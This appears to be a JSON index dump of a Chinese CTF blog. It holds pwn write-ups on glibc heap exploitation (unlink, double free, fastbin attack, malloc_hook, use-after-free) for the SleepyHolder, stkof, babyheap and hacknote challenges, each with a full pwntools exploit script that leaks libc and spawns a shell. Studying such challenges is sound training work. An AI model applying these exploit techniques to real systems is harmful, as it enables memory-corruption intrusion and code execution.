hold your secrets, and no one will be able to see it :)1. Keep secret2. Wipe secret3. Renew secret1What secret do you want to keep?1. Small secret2. Big secret3. Keep a huge secret and lock it forever1Tell me your secret: AAAAAA1. Keep secret2. Wipe secret3. Renew secret3Which Secret do you want to renew?1. Small secret2. Big secret1Tell me your secret: Small1. Keep secret2. Wipe secret3. Renew secret2Which Secret do you want to wipe?1. Small secret2. Big secret1 ​ 看看保护和文件格式： ​ 主要函数如下，除此之外本程序中的alarm()也需要keypatch掉。 ​ 分析主要函数： ​ Add():只允许分配small,big,huge三种secret，每种只能分配一次，而且huge只要分配过后，就不再允许使用huge secret了。另外，这三种secret的指针都位于bss段，是全局变量。 ​ Wipe():free()时未检查指针是否为空，存在Double free漏洞。 ​ Renew():输入限制大小，不可堆溢出。因此构造和输入payload时都要根据secret大小来选择。 ​ 另外程序中没有找到输出函数，大致方向还是修改got表，puts(func@plt)，计算偏移得到libc，再getshell。 B . 内存布局 申请small chunk和big chunk，然后释放small chunk。 申请huge chunk，此时由于malloc_consolidate()，small chunk被丢进unsort bin。 再释放small chunk，又把small chunk丢进fast bin。double free。 small chunk构造fake_chunk，并修改big chunk的标志位，欺骗系统相信fake chunk已经free，需要合并。 此时释放big chunk，系统会使其与small_chunk里面的fake_chunk合并，导致unlink。 此时写入fake chunk中的指针成功偏移。 C . Leak &amp; Getshell 通过small_ptr把big_ptr、small_ptr和3个标志位分别改成atoi@plt，free@got，和1。 renew(1)将puts@got写入small_ptr，其实是覆写了free@got。 free(2)相当于puts(atoi@plt)，通过计算可以透出libc地址啦。 现在我们已经成功透到了libc的地址，通过计算可以得到system地址了。 renew(1)将system_addr写入到small_ptr，其实也是覆写了free@got。 renew(2)将”/bin/sh\\x00”写入到big_ptr待用。 现在只要wipe(2)，实际上就是getshell咯(。・∀・)ノ。 D . Exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from pwn import *p = process(&#x27;./SleepyHolder&#x27;)elf = ELF(&#x27;./SleepyHolder&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)small_ptr = 0x06020D0free_addr = elf.got[free]puts_addr = elf.got[puts]puts_plt = elf.plt[puts]atoi_addr = elf.got[atoi]atoi_offset = libc.symbols[atoi]system_offset = libc.symbols[system]def add(index,content): p.recvuntill(&quot;3. Renew secret\\n&quot;) p.send(str(1)) p.recvuntil(&quot;\\n&quot;) p.send(str(index)) p.recvuntill(&quot;Tell me your secret:\\n&quot;) p.send(content)def wipe(index): p.recvuntill(&quot;3. Renew secret\\n&quot;) p.send(str(2)) p.recvuntill(&quot;2. Big secret\\n&quot;) p.send(str(index))def renew(index,content): p.recvuntill(&quot;3. Renew secret&quot;) p.send(str(3)) p.recvuntill(&quot;2. Big secret&quot;) p.send(str(index)) p.recvuntill(&quot;Tell me your secret:&quot;) p.send(content)#=======================Memory Arrange=======================add(1,&quot;AAAAAAAA&quot;)add(2,&quot;BBBBBBBB&quot;)wipe(1)add(3,&quot;CCCCCCCCC&quot;) #triger malloc_consolidate()wipe(1) #double freefake_chunk =p64(0)*2 #chunk header is uselessfake_chunk+=p64(small_ptr-0x18) #unlink ptrfake_chunk+=p64(small_ptr-0x10) #unlink ptr toofake_chunk+=p64(0x20) #made chunk2 believe that chunk1is free to triger unlinkadd(1,fake_chunk) #now we can move the small_ptr laterwipe(2) #triger the unlink#============================ Leak ===========================payload = &#x27;A&#x27;*8payload+=atoi_addr #big_chunk = atoi@gotpayload+=&#x27;A&#x27;*8 #the huge_ptr is useless anywaypayload+=free_addr #small_chunk = free@gotpayload+=p64(1)*3 #insure 3 flags == 1renew(1,payload) #change the chunk_ptr to gotrenew(1,puts_plt) #change free_addr to puts_pltwipe(2) #free(big_ptr) &lt;----&gt; puts(puts_plt)#=========================== GetShell ========================libc_base = u64(p.recvn(6).ljust(8,&#x27;/x00&#x27;)) - atoi_offsetsystem_addr = libc_base + system_offsetrenew(1,p64(system_addr))renew(2,&quot;/bin/sh\\x00&quot;)free(2)p.interactive()","categories":[],"tags":[{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"}]},{"title":"Unlink(stkof)","slug":"Unlink-stkof","date":"2020-03-02T12:57:20.000Z","updated":"2021-03-24T09:49:16.965Z","comments":true,"path":"2020/03/02/Unlink-stkof/","link":"","permalink":"http://example.com/2020/03/02/Unlink-stkof/","excerpt":"​ 关于unlink的介绍和入门。。。。","text":"​ 关于unlink的介绍和入门。。。。 ​ unlink也是一个看了好久看不懂的东西，今天算是整明白了。 0x00 . unlink 漏洞A . unlink原理​ 假设有如下chunk0，chunk1，其中chunk0是使用中的small，chunk1是已释放的small chunk，两者在内存上相邻。 ​ 由于chunk1已释放，所以位于small bin链表中，又与chunk2，chunk3在链表结构上相邻。 ​ 此时如果free(chunk0)，glibc机制就会判断前后(内存上)有无相邻的已释放chunk，如果有，就和chunk0一同合并成一个大chunk。而与此同时，还要把chunk1从small bin中“拔出来”，其中发生的断链，修改链表的操作就是unlink。换言之unlink就是一个从双向链表中抽出一个chunk的操作。（photo from ctf-wiki） ​ ​ 所以unlink只适用于非fast chunk，因为fast chunk不存在双向链表，同时fast chunk也并不是用完就马上回收的。 B . 历史的漏洞利用（32 bit）​ 那么如何通过unlink达到任意写的目的呢？曾经的unlink利用是这样的： ​ ​ 1.在进行unlink之前修改chunk0的fd和bk，使得FD = target_addr，BK = expect value（可以通过堆溢出或其他漏洞修改，或者构造fake chunk）。 ​ 2.进行合并操作，需要将chunk1的前驱后继的指向修改一下，改成chunk0的前驱后继，也就是将chunk1的FD和BK改成chunk0的FD和BK，在一起总要一条心嘛。 ​ 3.此时chunk1已经FD写入了target_addr，BK写入了expect value，在释放chunk0，使得chunk1进行unlink。 ​ 4.chunk1的unlink，实际上就是修改small bin中的前驱后继，将前驱的后继（原本是chunk1）改成自己的后继，将后继的前驱（原本是chunk1）改成自己的前驱。而系统是怎么修改前驱后继的呢，就是修改FD指针 + 8的地址（heap head 占8个字节，紧接着就是该chunk的fd指针）和修改FD指针 + 12的地址（heap head占8 Bytes，fd占4 Bytes，紧接着就是该chunk的bk指针）。 ​ 5.所以系统会将chunk1的FD–&gt;bk改成自己的BK，将BK–&gt;fd改成自己的FD，换句话说就是。 12FD-&gt;bk=BK; //target_addr - 12 + 12 = expect value;BK-&gt;fd=FD; //expect value + 8 = target_addr; ​ 这样就实现了任意写。 C . 如今的漏洞利用 （64 bit）​ 但是现在的glibc加强了保护机制，增加了以下检查过程。 123// fd bkif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV); \\ ​ 也就是说，必须使得chunk1前驱的后继，和后继的前驱都指向同一个p。至于p是啥，正常情况下当然是chunk1咯，但是既然要漏洞利用，那当然不能顺着系统机制来。 ​ 我们进行如下构造： 12chunk1-&gt;FD = p - 0x18;chunk1-&gt;BK = p - 0x10; ​ 那么系统检查时就会进行如下判断： 12chunk1-&gt;FD-&gt;bk == chunk1-&gt;BK-&gt;fd ; //bingo!! p - 0x18 + 0x18 == p - 0x10 +0x10; // We pass!! ​ 既然检查过了，就进行unlink吧。 12chunk1-&gt;FD-&gt;bk = chunk1-&gt;BK; //p - 0x18 + 0x18 = p - 0x10chunk1-&gt;BK-&gt;fd = chunk1-&gt;FD; //p - 0x10 + 0x10 = p - 0x18 ​ 也就是说，我们把p指针向前偏移了0x18。虽然不算是任意写，但也足够利用了。 0x01 . stkof writeupA . 程序分析 ​ useless()的功能大概是用来测试用户输出的chunk序号是否已分配，仅此而已。在主函数里没有找到可以输出的函数，所以可以考虑覆写got表来leak libc。 ​ 至于其他函数： add()没什么特别的。 delete()中free()后未将指针置空 fill()中再让用户输入一遍size，不同于add()中的size，因此可以堆溢出。 ​ 在本程序的几个重要函数中可以可以发现，chunk的堆指针被存放在了一个数组s[ ]中，而双击数组s可以发现，其地址是0x0602140，它是一个位于bss段的指针数组，换言之是一个可写的全局变量。s是我们覆写got表的关键。 ​ 有全局变量存在，可以利用unlink漏洞覆写got表了。 B .内存布局 申请4个chunk，其中chunk2是small chunk。（本程序没有申请限制，可以申请多一点，只要方便布局。） 用chunk1的堆溢出覆盖chunk2，改写其FD和BK成s[0]-0x10(即chunk2指针)，改写chunk3的头信息。 在上一步完成的同时要通过检查，使系统在释放chunk3时相信chunk2也已经释放了，从而向前合并。 这一合并不要紧，系统一不小心就把chunk2处的存放的指针向低地址偏移了0x18，够我们地肆无忌惮发挥了。 C . Leak &amp; Getshell 再改写chunk2的内容，实际上就是覆写s数组，改写chunk指针。此时可写入got表地址了。 覆写情况：s[0]=free@got,s[1]=puts@got,s[2]=atol@got。 再利用fill函数将free@got改成puts@got，free[1]就得到了puts@plt。 通过计算，得到libc地址和system地址，通过elf文件搜索可以找到“/bin/sh”。 利用fil将atol@got改写成system地址。 最后直接发送”/bin/sh”都会调用system函数，getshell。 D . Exp​ 贴一下脚本呗，虽然不是自己写的。（exp from ctf-wiki）有空再自己写一遍。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]if args[&#x27;DEBUG&#x27;]: context.log_level = &#x27;debug&#x27;context.binary = &quot;./stkof&quot;stkof = ELF(&#x27;./stkof&#x27;)if args[&#x27;REMOTE&#x27;]: p = remote(&#x27;127.0.0.1&#x27;, 7777)else: p = process(&quot;./stkof&quot;)log.info(&#x27;PID: &#x27; + str(proc.pidof(p)[0]))libc = ELF(&#x27;./libc.so.6&#x27;)head = 0x602140def alloc(size): p.sendline(&#x27;1&#x27;) p.sendline(str(size)) p.recvuntil(&#x27;OK\\n&#x27;)def edit(idx, size, content): p.sendline(&#x27;2&#x27;) p.sendline(str(idx)) p.sendline(str(size)) p.send(content) p.recvuntil(&#x27;OK\\n&#x27;)def free(idx): p.sendline(&#x27;3&#x27;) p.sendline(str(idx))def exp(): # trigger to malloc buffer for io function alloc(0x100) # idx 1 # begin alloc(0x30) # idx 2 # small chunk size in order to trigger unlink alloc(0x80) # idx 3 # a fake chunk at global[2]=head+16 who&#x27;s size is 0x20 payload = p64(0) #prev_size payload += p64(0x20) #size payload += p64(head + 16 - 0x18) #fd payload += p64(head + 16 - 0x10) #bk payload += p64(0x20) # next chunk&#x27;s prev_size bypass the check payload = payload.ljust(0x30, &#x27;a&#x27;) # overwrite global[3]&#x27;s chunk&#x27;s prev_size # make it believe that prev chunk is at global[2] payload += p64(0x30) # make it believe that prev chunk is free payload += p64(0x90) edit(2, len(payload), payload) # unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8 free(3) p.recvuntil(&#x27;OK\\n&#x27;) # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got payload = &#x27;a&#x27; * 8 + p64(stkof.got[&#x27;free&#x27;]) + p64(stkof.got[&#x27;puts&#x27;]) + p64( stkof.got[&#x27;atoi&#x27;]) edit(2, len(payload), payload) # edit free@got to puts@plt payload = p64(stkof.plt[&#x27;puts&#x27;]) edit(0, len(payload), payload) # free global[1] to leak puts addr free(1) puts_addr = p.recvuntil(&#x27;\\nOK\\n&#x27;, drop=True).ljust(8, &#x27;\\x00&#x27;) puts_addr = u64(puts_addr) log.success(&#x27;puts addr: &#x27; + hex(puts_addr)) libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;] binsh_addr = libc_base + next(libc.search(&#x27;/bin/sh&#x27;)) system_addr = libc_base + libc.symbols[&#x27;system&#x27;] log.success(&#x27;libc base: &#x27; + hex(libc_base)) log.success(&#x27;/bin/sh addr: &#x27; + hex(binsh_addr)) log.success(&#x27;system addr: &#x27; + hex(system_addr)) # modify atoi@got to system addr payload = p64(system_addr) edit(2, len(payload), payload) p.send(p64(binsh_addr)) p.interactive()if __name__ == &quot;__main__&quot;: exp()","categories":[],"tags":[{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"}]},{"title":"Malloc_Hook小记","slug":"Malloc-Hook","date":"2020-03-01T07:09:47.000Z","updated":"2021-03-24T09:46:47.705Z","comments":true,"path":"2020/03/01/Malloc-Hook/","link":"","permalink":"http://example.com/2020/03/01/Malloc-Hook/","excerpt":"​ malloc_hook的介绍以及用堆进行malloc_hook攻击。","text":"​ malloc_hook的介绍以及用堆进行malloc_hook攻击。 ​ 昨天的babyheap算是碰上的第一个malloc_hook利用，而且看这么简单的偏移都看不明白，还是记一下吧。 0x00 关于malloc_hook​ malloc_hook是一个位于main_arena附近的函数指针。 ​ 当系统调用malloc，free函数时，会对此指针进行检查，如果指针非空则跳转到该地址并执行。所以，将shellcode或者system(“/bin/sh”)的地址写入到malloc_hook中再想办法调用是一个比较常见的getshell思路。 0x01 malloc_hook位置​ malloc_hook位于main_arena(如果不知道main_arena地址可以直接使用命令 x/20xg &amp;main_arena 查看内存和地址)往上，offset = 0x10: ​ 一般来说malloc_hook为空，但是有一次偶然发现了malloc_hook未被攻击却有值，后来才发现是程序还没有初始化。 0x03 malloc_hook攻击A.如何写入​ 如果程序中存在任意写的漏洞，则用户可以很容易的进行malloc_hook攻击。这里用堆做一个实例（实际上也通常用堆）。就fastbin attack来说，如果我们改写chunk的fd，使其指向malloc_hook上方一定偏移处，就可以填充并写入malloc_hook。所以问题的关键就是我们要在哪儿创建堆，创建多大的堆，如何填充数据。 B.用堆getshell​ 1.首先我们需要知道，创建堆时填充数据的位置在chunk_ptr + 0x10（即free chunk的FD BK指针处）的位置，而前面0x10用来存放堆结构的部分信息，其中很重要的一个信息就是chunk_size。在创建堆时chunk_size是避免检查，决定填充偏移的关键。 ​ 2.由此我们需要在malloc_hook附近找一个合适的“chunk_size”，也就是说，用该地址处的数据充当chunk_size，而且要让其满足fastchunk的大小。经过实验，可以找到main_ arena - 0x40 + 0xd 这个位置（不理解的话可以0x0 – 0x10 都试一下，找最合适的偏移）。 ​ 在此偏移处的0x7f这个字节恰好满足需求，属于fastchunk。所以我们可以在这个地址malloc（0x60），系统就会给我们分配0x70的空间，也满足0x7f的chunksize。 ​ 3.申请好chunk之后，我们还需要知道偏移量。假设我们已经leak出了libc_base，那么就可以根据main_arena在libc上的固定偏移并通过计算得知以下关系： 1234567main_arena == libc_base + 0x3c4b20 chunk_addr == main_arena - 0x40 + 0xdchunk_addr == libc_base + 0x3c4b20 - 0x40 + 0xdchunk_addr == libc_base + 0x3c4aedmalloc_hook== main_arena - 0x10fill_size == malloc_hook - chunk_addrfill_size == 0x23 ​ 所以说我们需要填充的大小就是0x23。 123payload = &#x27;A&#x27; * 3payload +=p64(0)payload +=p64(shellcode) ​ 4.填充好之后，再进行一次malloc()就可以getshell了。","categories":[],"tags":[{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"}]},{"title":"Fastbin attack (Babyheap)","slug":"Fastbin_attack(Babyheap)","date":"2020-02-29T13:09:47.000Z","updated":"2021-03-24T09:49:52.110Z","comments":true,"path":"2020/02/29/Fastbin_attack(Babyheap)/","link":"","permalink":"http://example.com/2020/02/29/Fastbin_attack(Babyheap)/","excerpt":"​ 利用malloc_hook解题。","text":"​ 利用malloc_hook解题。 1.关于Fast_bin​ fast bin和其他的bin一样，都是一种用来记录free chunk的链表数据结构有单链表有双链表，因种类不同功能不同而采用不同的结构。fast bin专门使用于存放比较小的chunk，具体为16 bytes – 80 bytes（此处指malloc的实际大小）fast bin的设计初衷就是进行快速的小内存分配和释放，因此fast chunk之间是不进行合并的，即不存在unlink。因此其 next_chunk 的 prev_inuse 位也不会被清空。，也就催生了fast bin的漏洞。 2.babyheap复现A.题目分析 Link – https://uaf.io/assets/0ctfbabyheap 常规操作：丢ubuntu分析：保护全开，一般都是堆题。。 丢ida_64分析： 123456789101112131415161718192021222324252627282930__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char *v4; // [rsp+8h] [rbp-8h] v4 = sub_B70(); while ( 1 ) &#123; menu(); Read(); switch ( off_14F4 ) &#123; case 1uLL: Add(v4); break; case 2uLL: Fill(v4); break; case 3uLL: Free(v4); break; case 4uLL: Dump(v4); break; case 5uLL: return 0LL; default: continue; &#125; &#125;&#125; Add()：新建chunk,由用户输入size,用calloc分配内存,先行初始化chunk。 Fill()：写入chunk,由用户决定size，与Add()size不同,所以存在堆溢出。 Free()：删除chunk,而且指针置空,不存在UAF漏洞。 Dump()：输出chunk,没啥特别。 另外还有一点就是，文件存在alarm()函数，因此在调试时有时间限制。 不过只要在伪代码中，将汇编指令修改一下，将call alarm改成nop就行。 所以说我们可以利用的只有堆溢出这一个漏洞。 B.Leak Libc_base对于这个题目可以进行fastbin_attack,先新建5个chunk，大小功能如下。 12345 Add(0x20) #used for overwrite Add(0x20) Add(0x20) #used to point the same aera of chunk4 Add(0x20) #used for overwriteAdd(0x80) #used to leak the libc_base 各个堆块结构如下： ​ 根据堆结构，填充空余部分时要这样写脚本： 12 payload = p64(0) * 5 + p64(31)payload+= p64(0) * 5 + p64(31) + p8(0xC0) ​ p8(0xC0)也就刚好覆盖到了chunk2的FD指针。接着就是一系列内存布局，目的是让leak出small chunk2的FD指针，因为当程序中只有一个small/unsort chunk在链表上时，其FD和BK都指向距离main_arena 0x58的地址。也就是说： Leak_addr - 0x58 = main_arena main_arena - 0x3c4b20 = libc_base 内存布局如下(非实际脚本，仅用于理解)： 123456789101112 free(chunk1) main_arena--&gt;chunk1 free(chunk2) main_arena--&gt;chunk2--&gt;chunk1 fill(chunk0) main_arena--&gt;chunk2--&gt;chunk4 #overwrite fill(chunk3) #modify the size of chunk4 (0x91 --&gt; 0x31) #so we can malloc chunk4 as fastbin add(0x20) main_arena--&gt;chunk4&lt;--chunk2 add(0x20) main_arena chunk4&lt;--chunk2 #share the same addr fill(chunk3) #modify the size of chunk4 (0x91 --&gt; 0x31)#so we can pass the check and free chunk4 as smallbin add(0x80) #chunk 5 , for avoiding the merging into top_chunkfree(chunk4) main_arena-0x58&lt;--chunk4&lt;--chunk2 dump(chunk2) #Leak libc_base ​ 经过布局之后可以使得chunk2和chunk4指向相同。 C. Getshell​ 那么现在有了libc_base要怎么利用咧。可以通过one_gadget搜libc里的excute(“/bin/sh”)，搜出来的不止一个，需要一个个尝试，再找机会调用运行。今天新学到的一个小姿势：main_arena上方有一个函数指针叫malloc_hook，正常情况下为空，但如果系统在调用malloc， realloc，free时监测到malloc_hook非空就会立即执行malloc_hook中的汇编指令。针对malloc_hook的攻击会另外再写一篇小记。 ​ 所以说利用思路就是：可以利用堆，修改堆的FD指针指向malloc_hook的一定偏移处，使得fill(chunk)时可以恰好覆盖到malloc_hook并执行。 将chunk4申请出来并将其大小压缩在fastchunk的范围。 释放chunk4，此时用chunk2覆写chunk4的FD指针，使其指向距离malloc_hook的一定偏移处。(准确地址为libc_base+0x3C4AED，在此处恰好可以分配到合适的fastbin，这里的偏移计算涉及malloc_hook攻击。) 申请两个chunk(fastchunk)，第一次会分配到chunk4，第二次会分配到新的chunk6，chunk6的地址正是目标地址。 将shellcode写入到chunk6。 执行一次add()即可getshell。 D.Exploit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475from pwn import *context.log_level = &quot;debug&quot;p = process(&#x27;./babyheap&#x27;)env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;def add(size): p.sendlineafter(&quot;Command: &quot;,str(1)) p.sendlineafter(&quot;Size: &quot;,str(size)) def fill(index,content): p.sendlineafter(&quot;Command: &quot;,str(2)) p.sendlineafter(&quot;Index: &quot;,str(index)) p.sendlineafter(&quot;Size: &quot;,str(len(content))) p.sendlineafter(&quot;Content: &quot;,content)def free(): p.sendlineafter(&quot;Command: &quot;,str(3)) p.sendlineafter(&quot;Index: &quot;,str(index)) def dump(): p.sendlineafter(&quot;Command: &quot;,str(4)) p.sendlineafter(&quot;Index: &quot;,str(index)) return p.recvline()add(0x20) #used for overwrite 0x..............00add(0x20) # 0x..............30add(0x20) #used to point the same aera of chunk4 0x..............60add(0x20) #used for overwrite 0x..............90add(0x80) #used to leak the libc_base 0x..............C0free(1)free(2)payload = p64(0) * 5payload+=p64(0x31)payload+=p64(0) * 5payload+=p64(0x31)payload+=p64(0xC0)fill(0,payload) #now the chunk2 is pointing at the chunk4, they share the same addr#In order to draw the chunk4 into fastbin ,its size need to be modifiedpayload = p64(0) * 5payload+=p64(0x31)fill(3,payload) #now the size of chunk4 is 0x30,we can easily malloc it as a fastchunkadd(0x20) #chunk2add(0x20) #chunk4#In order to put the chunk4 into smallbin ,its size need to be modifiedpayload = p64(0) * 5payload+=p64(0x91)fill(3,payload) #now the size of chunk4 is 0x90,we can easily free it as a smallchunkadd(0x80) #avoid merging into top_chunk :chunk5free(4) #here we&#x27;ve got the fd ptr of chunk4,which is pointing at main_arena-0x58 while it was freedfd_ptr = u64(dump(2)[:8])main_arena = fd_ptr - 0x58libc_base = main_arena - 0x3c4b20 #0x3c4b20 is the offset of main_arena in libcadd(0x60) #transform the chunk4 into fastchunk again,so we are able to fastbin attackfree(4) payload = p64(0) * 5payload+=p64(main_arena - 0x33) #the same as : malloc_hook-0x23 || libc_base+0x3C4B20-0x33 || libc_base - 0x3C4AEDfill(3,payload)add(0x60) #chunk 4add(0x60) #chunk 6payload = &#x27;A&#x27;*3 #length of &quot;AAA&quot;+p64(0)*2 = 0x23,it&#x27;s the very length to fill the malloc_hookpayload+=p64(0) * 2payload+=p64(libc_base + 0x4526a)fill(6,payload)add(1) #add() to call excute(&quot;/bin/sh&quot;) &quot;1&quot;has not meaningp.interactive()","categories":[],"tags":[{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"}]},{"title":"UAF (Hacknote)","slug":"UAF-Hacknote","date":"2020-02-28T03:14:08.000Z","updated":"2021-03-24T09:47:23.314Z","comments":true,"path":"2020/02/28/UAF-Hacknote/","link":"","permalink":"http://example.com/2020/02/28/UAF-Hacknote/","excerpt":"​ 从头开始学习堆堆堆堆😥😥😥（其实之前也没学多少）。","text":"​ 从头开始学习堆堆堆堆😥😥😥（其实之前也没学多少）。 ​ 课设做很久了，摸鱼划水也很久了，抓紧时间系统地肝一下堆题吧。再不好好学要废了。。 1.关于UAF​ 在malloc得到一个指针并使用后，通常要将其释放并置空。若是出现未将其置空的情况，就容易出现可利用的漏洞，使得用户仍然可以运用指针内的数据或是调用其中的指令。简单来说i，UAF就是对一个已释放内存块的再利用。 CTF - wiki 相关如下： 内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。 内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。 （Link - https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/） Example from how2heap1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; typedef struct name &#123; char *myname; void (*func)(char *str); &#125; NAME; void myprint(char *str) &#123; printf(&quot;%s\\n&quot;, str); &#125; void printmyname() &#123; printf(&quot;call print my name\\n&quot;); &#125; int main() &#123; NAME *a; a = (NAME *)malloc(sizeof(struct name)); a-&gt;func = myprint; a-&gt;myname = &quot;I can also use it&quot;; a-&gt;func(&quot;this is my function&quot;); // free without modify free(a); a-&gt;func(&quot;I can also use it&quot;); // free with modify a-&gt;func = printmyname; a-&gt;func(&quot;this is my function&quot;); // set NULL a = NULL; printf(&quot;this pogram will crash...\\n&quot;); a-&gt;func(&quot;can not be printed...&quot;); &#125;/*The output:$use_after_free git:(use_after_free) ✗ ./use_after_free this is my functionI can also use itcall print my namethis pogram will crash...[1] 38738 segmentation fault (core dumped) ./use_after_free*/ 2.hacknote复现​ (Link - https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote) A.题目分析​ 常规操作：丢Ubuntu 1.checksec 2.file（其实有保护也不会绕过。。。tcl） ​ 然后丢IDA看源码和伪码： ​ 主要函数有这几个，添加删除输出主函数，magic()是喜闻乐见的system后门。菜鸡看到后门函数的第一直觉就是改got表，或者ROP。。。但这里好像不太行，怎么说也是个正经堆题啊。 ​ add_note: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546unsigned int add_note()&#123; _DWORD *v0; // ebx signed int i; // [esp+Ch] [ebp-1Ch] int size; // [esp+10h] [ebp-18h] char buf; // [esp+14h] [ebp-14h] unsigned int v5; // [esp+1Ch] [ebp-Ch] v5 = __readgsdword(0x14u); if ( count &lt;= 5 ) &#123; for ( i = 0; i &lt;= 4; ++i ) &#123; if ( !notelist[i] ) &#123; notelist[i] = malloc(8u); if ( !notelist[i] ) &#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; *notelist[i] = print_note_content; // put字段，*notelist[i]为函数指针 printf(&quot;Note size :&quot;); read(0, &amp;buf, 8u); size = atoi(&amp;buf); v0 = notelist[i]; v0[1] = malloc(size); if ( !*(notelist[i] + 1) ) &#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; printf(&quot;Content :&quot;); read(0, *(notelist[i] + 1), size); puts(&quot;Success !&quot;); ++count; return __readgsdword(0x14u) ^ v5; &#125; &#125; &#125; else &#123; puts(&quot;Full&quot;); &#125; return __readgsdword(0x14u) ^ v5;&#125; ​ print_note:调用了note中的函数指针，即print_content_function()函数 12345678910111213141516171819unsigned int print_note()&#123; int v1; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(&quot;Index :&quot;); read(0, &amp;buf, 4u); v1 = atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt;= count ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( notelist[v1] ) (*notelist[v1])(notelist[v1]); // 调用notelist[v1]所指函数 return __readgsdword(0x14u) ^ v3; // 因此利用思路为：改写notelist[v1]之所指&#125; ​ del_note:在此函数中发现，函数仅对堆进行free，但并未置空，因此存在UAF漏洞。 1234567891011121314151617181920212223unsigned int del_note()&#123; int v1; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(&quot;Index :&quot;); read(0, &amp;buf, 4u); v1 = atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt;= count ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( notelist[v1] ) &#123; free(*(notelist[v1] + 1)); free(notelist[v1]); puts(&quot;Success&quot;); &#125; return __readgsdword(0x14u) ^ v3;&#125; ​ 还有要注意的是，对于每个note，都有一个notelist函数指针ptr，指向print_note_content()。并在新建note的时候就会被初始化为print_note_content(),所以无法对于单个note的ptr进行改写。 print_note_content: 1234int __cdecl print_note_content(int a1)&#123; return puts(*(a1 + 4));&#125; ​ 也就是说每一个note，都包含了两个chunk，第一个（8 bytes）存的是函数指针ptr，另一个是指向内容的指针ptr_content。第二个存的是用户输入的content。 B.利用思路​ 1.能由用户控制的内容只有content，所以基本思路就是用一个note_a的输入过程，去改写note_b的函数指针ptr，再print(note_b) ​ 2.要使得note_b被note_a改写，除非后者进行堆溢出，或者两者再某一时刻同时指向同一块内存区域。因此可以想到利用UAF漏洞，先free(note_b)再add(note_a)，将payload写入到note_a中。 ​ 3.如果有两个相邻的note，四个相邻的chunk，结构如下： - 对于函数指针和内容指针，各占4 Bytes，再加上其他chunk数据并遵循堆内存对齐，可知chunk1和chunk3分别为16 Bytes。 分别free之后bin链表内容为：(head) chunk1 –&gt; chunk2 –&gt; chunk3 –&gt; chunk4 (tail)此时再申请出note2，作为改写用的note_a。 而在malloc时，如果chunk2和chunk4的大小(即size of content)大于16 Bytes，且note_a大小小于16 Bytes，系统就会从bin链表尾部向头部寻找适当大小的已释放chunk，进而将chunk3和chunk1分配给note_a，而chunk3和chunk1中的两个指针正是我们要改写的地方。 所以我们知道，需要给note0和note1的content部分分配32bytes的大小。 ​ 4.内存分配情况决定之后，只需要将note0视作note_b，在note_a中写入payload（note_a的content部分与note_b的content部分为同一内存块），即可改写note_b的函数指针。调用函数print(note_b)即可getshell。 C.exp:123456789101112131415161718192021222324252627282930313233343536from pwn import *r = process(&#x27;./hacknote&#x27;)def addnote(size, content): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(size)) r.recvuntil(&quot;:&quot;) r.sendline(content) def delnote(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))def printnote(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))magic = 0x08048986addnote(32, &quot;aaaa&quot;) # add note 0addnote(32, &quot;ddaa&quot;) # add note 1delnote(0) # delete note 0delnote(1) # delete note 1addnote(8, p32(magic)) # add note 2printnote(0) # print note 0r.interactive()","categories":[],"tags":[{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"}]}],"categories":[],"tags":[{"name":"AndroidRe","slug":"AndroidRe","permalink":"http://example.com/tags/AndroidRe/"},{"name":"Summary","slug":"Summary","permalink":"http://example.com/tags/Summary/"},{"name":"StackOverflow","slug":"StackOverflow","permalink":"http://example.com/tags/StackOverflow/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://example.com/tags/WriteUp/"},{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"}]}